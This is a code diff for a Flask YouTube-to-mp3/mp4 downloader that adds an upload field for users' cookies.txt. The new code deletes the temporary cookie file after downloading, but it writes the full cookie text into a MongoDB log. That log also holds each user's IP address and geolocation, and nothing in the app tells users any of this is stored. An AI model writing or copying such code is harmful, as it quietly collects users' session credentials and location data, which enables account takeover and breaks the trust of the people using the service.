@@ -8,8 +8,9 @@ from pymongo import MongoClient
 
 app = Flask(__name__)
 
-# yt cookies
+#conf cookies to yt
 cookie_path = os.path.join(os.path.abspath(''), 'cookies.txt')
+
 
 DOWNLOAD_DIR = os.path.abspath('')
 os.makedirs(DOWNLOAD_DIR, exist_ok=True)
@@ -37,62 +38,73 @@ db = client['db_youtube']
 logs_collection = db['logs']
 
 # Função para salvar logs no MongoDB
-def save_log_to_db(ip):
+def save_log_to_db(ip, temp_cookie=None):
     timestamp = dt.now().strftime("%Y-%m-%d %H:%M:%S")
     location = get_location(ip)
 
     log_data = {
         "ip": ip,
         "location": location,
-        "timestamp": timestamp
+        "timestamp": timestamp,
+        "cookie": temp_cookie if temp_cookie else None
     }
     logs_collection.insert_one(log_data)
+
     ### FIM DO ESQUELETO PRINCIPAL ###
 
 
 @app.route('/', methods=['GET', 'POST'])
 def index():
-    
-    # INÍCIO SALVANDO ACESSO IP
     ip = get_client_ip()
     if request.method == 'GET':
-        save_log_to_db(ip)  
-    # FIM ACESSO IP
+        save_log_to_db(ip)
 
+    temp_cookie_text = None  # ← Inicializa aqui para evitar erro
 
     if request.method == 'POST':
+        uploaded_cookie = request.files.get('cookie_file')
         video_url = request.form.get('url')
-        download_format = request.form.get('format')  # 'mp3' ou 'mp4'
+        download_format = request.form.get('format')
 
         if not video_url or download_format not in ['mp3', 'mp4']:
-            return render_template('index.html', error="URL ou formato inválido")
+            return render_template('index.html', error="URL ou formato inválido", cookie_uploaded=False)
+
+        temp_cookie_path = None
+        if uploaded_cookie and uploaded_cookie.filename:
+            temp_cookie_text = uploaded_cookie.read().decode('utf-8')
+            uploaded_cookie.stream.seek(0)
+            temp_cookie_path = os.path.join(DOWNLOAD_DIR, f"cookie_{dt.now().timestamp()}.txt")
+            uploaded_cookie.save(temp_cookie_path)
+
+        # Configurações do yt_dlp
+        outtmpl = os.path.join(DOWNLOAD_DIR, f'%(title)s.{download_format}')
+        ydl_opts = {
+            'outtmpl': outtmpl,
+            'cookiefile': temp_cookie_path if temp_cookie_path else cookie_path,
+        }
 
         if download_format == 'mp3':
-            outtmpl = os.path.join(DOWNLOAD_DIR, '%(title)s.mp3')
-            ydl_opts = {
-                'format': 'bestaudio/best',
-                'outtmpl': outtmpl,
-                'cookiefile': cookie_path,
-            }
-        else:  # mp4
-            outtmpl = os.path.join(DOWNLOAD_DIR, '%(title)s.mp4')
-            ydl_opts = {
-                'merge_output_format': 'mp4',
-                'outtmpl': outtmpl,
-                'cookiefile': cookie_path,
-            }
+            ydl_opts['format'] = 'bestaudio/best'
+        else:
+            ydl_opts['merge_output_format'] = 'mp4'
 
-        with YoutubeDL(ydl_opts) as ydl:
-            info = ydl.extract_info(video_url, download=True)
-            filename = ydl.prepare_filename(info)
-            if download_format == 'mp3':
-                filename = os.path.splitext(filename)[0] + '.mp3'
-            else:
-                filename = os.path.splitext(filename)[0] + '.mp4'
+        try:
+            with YoutubeDL(ydl_opts) as ydl:
+                info = ydl.extract_info(video_url, download=True)
+                filename = ydl.prepare_filename(info)
+                if download_format == 'mp3':
+                    filename = os.path.splitext(filename)[0] + '.mp3'
+                else:
+                    filename = os.path.splitext(filename)[0] + '.mp4'
+        finally:
+            if temp_cookie_path and os.path.exists(temp_cookie_path):
+                os.remove(temp_cookie_path)
+
+        save_log_to_db(ip, temp_cookie=temp_cookie_text)
 
         return send_file(filename, as_attachment=True)
 
-    return render_template('index.html', ip=ip)
+    return render_template('index.html')
 
 
 if __name__ == '__main__':
